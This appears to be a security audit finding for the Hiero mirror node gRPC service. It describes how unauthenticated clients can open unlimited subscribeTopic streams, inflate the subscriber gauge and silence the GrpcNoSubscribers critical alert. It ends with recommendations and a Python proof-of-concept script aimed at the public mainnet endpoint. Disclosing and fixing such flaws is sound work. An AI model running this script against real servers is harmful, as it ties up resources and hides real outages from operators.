### Title
Unauthenticated Subscriber Count Inflation via Unbounded `subscribeTopic()` Connections Suppresses Critical Monitoring Alerts

### Summary
`ConsensusController.subscribeTopic()` accepts connections from any unauthenticated client with no per-IP or global subscriber cap. Each accepted subscription unconditionally increments the `subscriberCount` AtomicLong gauge registered as `hiero.mirror.grpc.subscribers`. An attacker opening many gRPC connections with multiple concurrent calls per connection can inflate this gauge arbitrarily, suppressing the `GrpcNoSubscribers` critical alert and masking real subscriber loss from operators.

### Finding Description

**Exact code path:**

`ConsensusController.subscribeTopic()` at [1](#0-0)  performs no authentication, no per-IP check, and no global subscriber cap before delegating to `TopicMessageService::subscribeTopic`.

`TopicMessageServiceImpl.subscribeTopic()` unconditionally calls `subscriberCount.incrementAndGet()` on every subscription and `subscriberCount.decrementAndGet()` only on termination: [2](#0-1) 

The only guard is `topicExists()`, which merely checks that the topic ID resolves to a valid `TOPIC` entity: [3](#0-2) 

The `subscriberCount` is registered as the `hiero.mirror.grpc.subscribers` Prometheus gauge: [4](#0-3) 

**Root cause:** No global maximum subscriber count, no per-IP connection limit, and no per-client subscription limit exist anywhere in the gRPC service layer.

**Why the only existing limit is insufficient:**

`NettyProperties.maxConcurrentCallsPerConnection` defaults to 5 and is applied in `GrpcConfiguration`: [5](#0-4) [6](#0-5) 

This limits calls *per connection*, not total connections or per-IP connections. An attacker opening N TCP connections can hold 5N concurrent subscriptions. There is no per-IP connection limit and no global cap.

The optional GCP backend policy `maxRatePerEndpoint: 250` [7](#0-6)  throttles new request *rate*, not sustained concurrent open streaming connections, and is GCP-specific infrastructure that is not enforced at the application layer.

### Impact Explanation

The `GrpcNoSubscribers` alert is configured as `severity: critical` and fires when `sum(hiero_mirror_grpc_subscribers) <= 0` for 5 minutes: [8](#0-7) 

An attacker holding even a small number of fake long-lived subscriptions (e.g., 10 connections × 5 calls = 50 fake subscribers) permanently suppresses this alert. If all legitimate subscribers disconnect due to a real outage or misconfiguration, the gauge never reaches zero, the critical alert never fires, and operators have no automated signal that real subscriber coverage has been lost. The Grafana "Active Subscribers" stat panel [9](#0-8)  also shows inflated numbers, masking the true subscriber state.

### Likelihood Explanation

The gRPC port 5600 is publicly exposed as the mirror node's HCS subscription endpoint. No authentication is required. The attack requires only a gRPC client library and a valid topic ID (which is public on-chain data). Opening hundreds of persistent streaming connections is trivially scriptable. The attacker does not need to send or receive any messages — simply holding the connections open is sufficient to keep `subscriberCount` elevated indefinitely.

### Recommendation

1. **Enforce a global maximum subscriber count**: Add a `maxSubscribers` property to `GrpcProperties` and check it in `TopicMessageServiceImpl.subscribeTopic()` before incrementing, returning `RESOURCE_EXHAUSTED` if exceeded.
2. **Add per-IP connection tracking**: Track active subscription counts per remote IP using a `ConcurrentHashMap` and reject new subscriptions from IPs exceeding a configurable per-IP limit.
3. **Add a `GrpcHighSubscribers` alert**: Alert when `hiero_mirror_grpc_subscribers` exceeds a reasonable threshold (e.g., 2× expected peak), which would detect inflation attacks independently of the `GrpcNoSubscribers` suppression.
4. **Enforce connection-level limits at the Netty layer**: Use `maxConnectionsPerIp` or equivalent Netty/load-balancer controls to cap TCP connections per source IP.

### Proof of Concept

**Preconditions:** Network access to gRPC port 5600; any valid topic ID (e.g., `0.0.1234`).

**Steps:**

```python
import grpc
import threading
from hedera.mirror.api.proto import consensus_service_pb2_grpc
from hedera.mirror.api.proto import consensus_service_pb2
from com.hederahashgraph.api.proto.java import basic_types_pb2

def open_fake_subscription(channel):
    stub = consensus_service_pb2_grpc.ConsensusServiceStub(channel)
    query = consensus_service_pb2.ConsensusTopicQuery()
    query.topicID.topicNum = 1234  # any valid topic
    # Consume the stream but never close it
    for _ in stub.subscribeTopic(query):
        pass

channels = []
threads = []
# Open 100 connections × 5 calls each = 500 fake subscribers
for i in range(100):
    ch = grpc.insecure_channel('mirror.mainnet.hedera.com:5600')
    channels.append(ch)
    for j in range(5):
        t = threading.Thread(target=open_fake_subscription, args=(ch,))
        t.daemon = True
        t.start()
        threads.append(t)

# hiero_mirror_grpc_subscribers now reads ~500
# GrpcNoSubscribers alert is permanently suppressed
# Real subscriber outages go undetected
```

**Result:** `hiero_mirror_grpc_subscribers` gauge is inflated to ~500. The `GrpcNoSubscribers` critical alert condition `<= 0` is never satisfied even if all legitimate subscribers disconnect, silencing the alert for the duration of the attack.

```java
    private Mono<?> topicExists(TopicMessageFilter filter) {
        var topicId = filter.getTopicId();
        return Mono.justOrEmpty(entityRepository.findById(topicId.getId()))
                .switchIfEmpty(
                        grpcProperties.isCheckTopicExists()
                                ? Mono.error(new EntityNotFoundException(topicId))
                                : Mono.just(Entity.builder()
                                        .memo("")
                                        .type(EntityType.TOPIC)
                                        .build()))
                .filter(e -> e.getType() == EntityType.TOPIC)
                .switchIfEmpty(Mono.error(new IllegalArgumentException("Not a valid topic")));
    }
```
